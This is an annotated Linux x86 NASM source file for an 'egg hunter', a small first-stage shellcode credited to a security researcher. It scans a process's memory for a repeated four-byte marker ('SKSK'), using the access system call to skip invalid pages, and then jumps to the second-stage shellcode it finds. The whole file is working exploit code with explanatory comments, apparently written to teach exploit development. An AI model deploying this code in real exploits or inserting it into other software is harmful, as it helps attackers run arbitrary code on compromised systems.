;egghunter.nasm
;this egg hunter uses the access system call and EFAULT flag to reliably search for an egg in the virtual memory address space for an arbitrary process
;Linux x86
;Sanjiv Kawa (@skawasec)
;www.popped.io
;Decemeber 4, 2016

global _start

section .text

_start:
  cld ;clearing the direction flag to prevent the egg hunter from failing as the scas instruction is used
  xor eax, eax  ;clearing out eax
  xor edx, edx  ;clearing out edx

next_page:
  ;the first address of relevance is typically 0x8048000
  ;however this egg hunter does not assume that the virtual memory address space for the given process follows conventional memory address spaces
  ;as such, the first memory address that is examined is 0x0001000
  or dx, 0xfff  ;page alignment

increment_address:
  inc edx ;increment the value in edx by 1
  lea ebx, [edx +0x4]	;add 4 to the value in edx and place this value into ebx

  ;at this point ebx contains the value in edx +4, this value represents a memory address we want to access
  ;ebx contains the single argument that is required by the access syscall, a memory address

  mov eax, 0x21		;move the access system call number, 33, into eax
  int 0x80		    ;execute system call and attempt to access the memory address currently specified by ebx

search_vas:
  ;the return value of the access system call is stored in al
  ;0xf2 represents the low byte of the `EFAULT` return value
  ;if this value exists in al, then the access system call attempted to access an invalid memory address
  ;as such, the zero flag will be set
  cmp al, 0xf2

  ;if the zero flag is set due to an invalid memory location, simply move to the next page
  je next_page

  ;otherwise, move the egg into eax
  ;eax is one of the native IA-32 instructions for doing string based comparisons with scas
  mov eax, 0x534B534B ;SKSK

  mov edi, edx  ;move the memory address currently in edx into edi as the edi register is used by scas

  ;compare the contents of memory stored in edi against the the dword value stored in eax
  ;this will essentially examine the contents of edi for the egg located in eax
  scasd

  ;if the contents of edi do not match the contents of eax, esentially meaning that the egg has not been found
  ;then increment to the next address
  jne increment_address

  ;if the contents of edi matches the contents of eax, the zero flag will be set, thus bypassing the previous instruction
  ;scasd will increment the value in edi by 4 bytes
  ;thus moving to the memory address of the next egg, 4 bytes before before the start of the shellcode

  ;compare the contents of memory stored in edi against the the dword value stored in eax
  ;this will essentially examine the contents of edi for the egg located in eax
  scasd

  ;if the contents of edi do not match the contents of eax, esentially meaning that the egg has not been found
  ;then increment to the next address
  jne increment_address

  ;if the contents of edi matches the contents of eax, the zero flag will be set, thus bypassing the previous instruction
  ;scasd will increment the value in edi by 4 bytes
  ;thus moving to the memory address at start of the shellcode

  jmp edi ;jump to the memory address where the second stage exists and pass control to the shellcode
